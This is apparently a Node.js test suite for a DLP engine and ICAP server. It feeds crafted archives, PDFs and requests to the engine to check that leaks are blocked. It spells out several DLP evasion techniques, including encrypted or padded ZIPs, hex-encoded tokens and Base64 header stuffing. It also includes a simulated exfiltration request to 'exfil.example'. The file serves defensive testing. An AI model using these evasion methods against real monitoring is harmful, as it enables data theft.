import assert from 'node:assert/strict';
import * as net from 'node:net';
import { test } from 'node:test';
import { deflateRawSync } from 'node:zlib';
import { DlpEngine } from '../dist/icap/dlp-engine.js';
import { IcapServer } from '../dist/icap/icap-server.js';
import { startWorkerHealthServer } from '../dist/worker-health-server.js';

/**
 * Helper: Build a multi-entry ZIP archive with Central Directory + EOCD supporting custom flags,
 * compression methods (0 STORE, 8 DEFLATE, 99 WinZip AES), and binary Buffers.
 */
function buildMultiEntryZipBuffer(entries) {
  const localParts = [];
  const cdParts = [];
  let localOffset = 0;

  for (const item of entries) {
    const nameBuf = Buffer.from(item.name, 'utf8');
    const rawBuf = Buffer.isBuffer(item.content)
      ? item.content
      : Buffer.from(String(item.content), 'utf8');
    const deflate = Boolean(item.deflate);
    const compressed = deflate ? deflateRawSync(rawBuf) : rawBuf;
    const method = item.method !== undefined ? item.method : deflate ? 8 : 0;
    const flags = item.flags !== undefined ? item.flags : 0;

    const localHdr = Buffer.alloc(30 + nameBuf.length);
    localHdr.writeUInt32LE(0x04034b50, 0);
    localHdr.writeUInt16LE(20, 4);
    localHdr.writeUInt16LE(flags, 6);
    localHdr.writeUInt16LE(method, 8);
    localHdr.writeUInt32LE(compressed.length, 18);
    localHdr.writeUInt32LE(rawBuf.length, 22);
    localHdr.writeUInt16LE(nameBuf.length, 26);
    nameBuf.copy(localHdr, 30);

    const cdHdr = Buffer.alloc(46 + nameBuf.length);
    cdHdr.writeUInt32LE(0x02014b50, 0);
    cdHdr.writeUInt16LE(20, 4);
    cdHdr.writeUInt16LE(20, 6);
    cdHdr.writeUInt16LE(flags, 8);
    cdHdr.writeUInt16LE(method, 10);
    cdHdr.writeUInt32LE(compressed.length, 20);
    cdHdr.writeUInt32LE(rawBuf.length, 24);
    cdHdr.writeUInt16LE(nameBuf.length, 28);
    cdHdr.writeUInt32LE(localOffset, 42);
    nameBuf.copy(cdHdr, 46);

    localParts.push(localHdr, compressed);
    cdParts.push(cdHdr);
    localOffset += localHdr.length + compressed.length;
  }

  const cdBuf = Buffer.concat(cdParts);
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0);
  eocd.writeUInt16LE(entries.length, 8);
  eocd.writeUInt16LE(entries.length, 10);
  eocd.writeUInt32LE(cdBuf.length, 12);
  eocd.writeUInt32LE(localOffset, 16);

  return Buffer.concat([...localParts, cdBuf, eocd]);
}

function sendRawTcp(port, wirePayload) {
  return new Promise((resolve, reject) => {
    const socket = net.createConnection({ host: '127.0.0.1', port }, () => {
      socket.write(wirePayload);
    });
    let out = '';
    socket.on('data', (chunk) => {
      out += chunk.toString('utf8');
    });
    socket.on('end', () => resolve(out));
    socket.on('close', () => resolve(out));
    socket.on('error', reject);
  });
}

test('[BUG-071] WorkerHealthServer returns 400 on malformed URL / clientError and 500 on internal error without crashing process', async () => {
  let throwInternal = false;
  const abort = new AbortController();
  const handle = startWorkerHealthServer(
    {
      host: '127.0.0.1',
      port: 0,
      dbHeartbeatTtlMs: 0,
      checkDatabase: async () => true,
      getIcapStatus: () => {
        if (throwInternal) {
          throw new Error('Simulated internal health snapshot failure');
        }
        return { enabled: true, listening: true, action: 'BLOCK', customKeywordsCount: 0 };
      },
    },
    abort.signal,
  );
  const { port } = await handle.ready;

  try {
    // 1. Malformed URL that throws TypeError in `new URL(req.url, 'http://127.0.0.1')`
    const badUrlRes = await sendRawTcp(
      port,
      'GET http://[::1 HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n',
    );
    assert.match(badUrlRes, /^HTTP\/1\.1 400 Bad Request/u);
    assert.doesNotMatch(badUrlRes, /200 OK/u);

    // 2. Malformed raw HTTP framing triggers `clientError` -> 400 Bad Request
    const clientErrRes = await sendRawTcp(port, 'BAD HTTPREQUEST\x00\r\n\r\n');
    assert.match(clientErrRes, /^HTTP\/1\.1 400 Bad Request/u);

    // 3. Internal listener throw returns 500 Internal Server Error (NEVER false-green 200 OK!)
    throwInternal = true;
    const err500 = await fetch(`http://127.0.0.1:${port}/health`);
    assert.equal(err500.status, 500);

    // 4. Server remains alive and serves 200 OK once healthy again
    throwInternal = false;
    const ok200 = await fetch(`http://127.0.0.1:${port}/health`);
    assert.equal(ok200.status, 200);
  } finally {
    abort.abort();
    await handle.stop();
  }
});

test('[BUG-072] DlpEngine blocks all 4 DLP evasion techniques while allowing legitimate OOXML with binary media', async () => {
  // 1a. Encrypted non-XML entry (.pdf / .bin) via flag 0x0001 -> Fail-Closed BLOCK
  const encryptedPdfZip = buildMultiEntryZipBuffer([
    { name: 'secret-report.pdf', content: 'encrypted-bytes', flags: 0x0001 },
  ]);
  const encPdfRes = await DlpEngine.scanPayloadAsync(encryptedPdfZip);
  assert.equal(encPdfRes.action, 'BLOCK');
  assert.ok(
    encPdfRes.violations.some((v) => v.rule === 'RULE_UNINSPECTABLE_ARCHIVE_EGRESS_PREVENTION'),
  );

  // 1b. WinZip AES encryption (method === 99, even if flag bit 0 is cleared) -> Fail-Closed BLOCK
  const aesZip = buildMultiEntryZipBuffer([
    { name: 'archive/data.bin', content: 'aes-ciphertext', method: 99, flags: 0x0000 },
  ]);
  const aesRes = await DlpEngine.scanPayloadAsync(aesZip);
  assert.equal(aesRes.action, 'BLOCK');

  // CRITICAL TRAP CHECK: Legitimate .docx with unencrypted binary PNG image + .rels MUST NOT be blocked!
  const fakePngBytes = Buffer.from([
    0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00, 0x00, 0x0d, 0x49, 0x48, 0x44, 0x52,
  ]);
  const validDocxWithMedia = buildMultiEntryZipBuffer([
    {
      name: '[Content_Types].xml',
      content: '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>',
      deflate: true,
    },
    {
      name: '_rels/.rels',
      content:
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>',
      deflate: true,
    },
    {
      name: 'word/media/image1.png',
      content: fakePngBytes,
      deflate: false,
    },
    {
      name: 'word/document.xml',
      content:
        '<w:document><w:body><w:p><w:r><w:t>Tài liệu hướng dẫn công khai bình thường.</w:t></w:r></w:p></w:body></w:document>',
      deflate: true,
    },
  ]);
  const cleanDocxRes = await DlpEngine.scanPayloadAsync(validDocxWithMedia);
  assert.equal(cleanDocxRes.isClean, true, 'Legitimate OOXML with word/media/image1.png must pass');
  assert.equal(cleanDocxRes.action, 'ALLOW');

  // 2a. >32 dummy entries padding before word/document.xml & xl/worksheets/sheet40.xml -> still caught & prioritized!
  const paddedEntries = Array.from({ length: 50 }, (_, idx) => ({
    name: `customXml/item${idx + 1}.xml`,
    content: `<item>benign-${idx}</item>`,
    deflate: true,
  }));
  paddedEntries.push({
    name: 'xl/worksheets/sheet40.xml',
    content:
      '<worksheet><sheetData><row><c><v>WM-abcdef0123456789</v></c></row></sheetData></worksheet>',
    deflate: true,
  });
  const paddedZipRes = await DlpEngine.scanPayloadAsync(buildMultiEntryZipBuffer(paddedEntries));
  assert.equal(paddedZipRes.action, 'BLOCK');

  // 2b. Nested .csv, .json, and .pdf inside subdirectories of a .zip -> scanned & blocked!
  const nestedCsvZip = buildMultiEntryZipBuffer([
    {
      name: 'exports/2026/q4/customers.csv',
      content: 'id,token\n1,WM-1122334455667788\n',
      deflate: true,
    },
  ]);
  assert.equal((await DlpEngine.scanPayloadAsync(nestedCsvZip)).action, 'BLOCK');

  const nestedJsonZip = buildMultiEntryZipBuffer([
    {
      name: 'deep/folder/payload.json',
      content: '{"leak":"TÀI LIỆU TUYỆT MẬT QUỐC GIA"}',
      deflate: true,
    },
  ]);
  assert.equal((await DlpEngine.scanPayloadAsync(nestedJsonZip)).action, 'BLOCK');

  // 2c. >1000 entries -> Fail-Closed BLOCK in full scan, deferred in incomplete Preview
  const over1000Entries = Array.from({ length: 1002 }, (_, idx) => ({
    name: `sub/f_${idx}.txt`,
    content: 'ok',
  }));
  const over1000Buf = buildMultiEntryZipBuffer(over1000Entries);
  const fullOver1000 = await DlpEngine.scanPayloadAsync(over1000Buf, {
    allowTruncatedPreview: false,
  });
  assert.equal(fullOver1000.action, 'BLOCK');
  const previewOver1000 = await DlpEngine.scanPayloadAsync(over1000Buf, {
    allowTruncatedPreview: true,
  });
  assert.equal(previewOver1000.action, 'ALLOW');

  // 3. Lowercase <feff...> PDF UTF-16BE hex string (case-insensitive /giu)
  const leakToken = 'WM-9988776655443322';
  const hexUtf16BeLower =
    '<feff' +
    Array.from(leakToken)
      .map((ch) => ch.charCodeAt(0).toString(16).padStart(4, '0').toLowerCase())
      .join('') +
    '>';
  const pdfLowerHexRes = await DlpEngine.scanPayloadAsync(
    Buffer.from(`%PDF-1.7\n1 0 obj << /Title ${hexUtf16BeLower} >> endobj`, 'utf8'),
  );
  assert.equal(pdfLowerHexRes.action, 'BLOCK');

  // 4. Base64 budget priority: 70 dummy Base64 values in HTTP headers must NOT hide Base64 leak in HTTP body
  const stuffedHeaders = {};
  for (let i = 0; i < 70; i++) {
    stuffedHeaders[`x-pad-${i}`] = Buffer.from(`benign-header-padding-value-${i}`, 'utf8').toString(
      'base64',
    );
  }
  const bodyB64Leak = Buffer.from(
    ' Confidential payload with token WM-deadbeefcafebabe1234 ',
    'utf8',
  ).toString('base64');
  const b64PriorityRes = await DlpEngine.scanPayloadAsync(
    Buffer.from(`body=${bodyB64Leak}`, 'utf8'),
    { httpRequestHeaders: stuffedHeaders },
  );
  assert.equal(b64PriorityRes.action, 'BLOCK');
});

test('[BUG-073] XML entity parser safely handles code points > 0x10FFFF, surrogates, and leading-zero padded entities without RangeError', async () => {
  // Out-of-range hex & decimal entities + surrogate + zero-padded WM- (&#00000087;&#x0000004d;-)
  const maliciousXml =
    '<w:document><w:body><w:p>' +
    '<w:t>Invalid: &#x110000; &#xFFFFFFFF; &#9999999; &#xD800; &#0; </w:t>' +
    '<w:t>&#00000087;&#x0000004d;-abcdef0123456789</w:t>' +
    '</w:p></w:body></w:document>';

  for (const deflate of [false, true]) {
    for (const allowTruncatedPreview of [false, true]) {
      const zipBuf = buildMultiEntryZipBuffer([
        { name: 'word/document.xml', content: maliciousXml, deflate },
      ]);
      const res = await DlpEngine.scanPayloadAsync(zipBuf, { allowTruncatedPreview });
      assert.equal(
        res.action,
        'BLOCK',
        `Must block without RangeError (deflate=${deflate}, preview=${allowTruncatedPreview})`,
      );
      assert.ok(res.violations.some((v) => v.type === 'FORENSIC_WATERMARK_LEAK'));
    }
  }
});

test('[BUG-074] ICAP Preview + null-body never sends 100 Continue, preserves keep-alive pipelining, and still scans URI & HTTP headers', async () => {
  const server = new IcapServer({
    enabled: true,
    host: '127.0.0.1',
    port: 0,
    action: 'BLOCK',
  });
  const { port } = await server.start();

  try {
    // 1. Two pipelined REQMOD requests with `Preview: 0` + `null-body`: first clean, second leaking in query string
    const cleanGetHdr = 'GET /api/v1/documents HTTP/1.1\r\nHost: docs.internal\r\n\r\n';
    const icapReq1 =
      `REQMOD icap://127.0.0.1/sda-dlp ICAP/1.0\r\n` +
      `Host: 127.0.0.1\r\n` +
      `Preview: 0\r\n` +
      `Connection: keep-alive\r\n` +
      `Encapsulated: req-hdr=0, null-body=${Buffer.byteLength(cleanGetHdr)}\r\n\r\n` +
      cleanGetHdr;

    const leakGetHdr =
      'GET /upload?leak=WM-abcdef0123456789 HTTP/1.1\r\nHost: exfil.example\r\n\r\n';
    const icapReq2 =
      `REQMOD icap://127.0.0.1/sda-dlp ICAP/1.0\r\n` +
      `Host: 127.0.0.1\r\n` +
      `Preview: 1024\r\n` +
      `Connection: close\r\n` +
      `Encapsulated: req-hdr=0, null-body=${Buffer.byteLength(leakGetHdr)}\r\n\r\n` +
      leakGetHdr;

    const wireOut = await sendRawTcp(port, icapReq1 + icapReq2);
    assert.doesNotMatch(wireOut, /100 Continue/u, 'Must NEVER send 100 Continue for null-body');
    assert.doesNotMatch(
      wireOut,
      /400 Bad Request/u,
      'Must NEVER corrupt pipelined keep-alive stream with 400',
    );
    assert.match(wireOut, /ICAP\/1\.0 204 No modifications/u);
    assert.match(wireOut, /HTTP\/1\.1 403 Forbidden/u);
  } finally {
    await server.stop();
  }
});
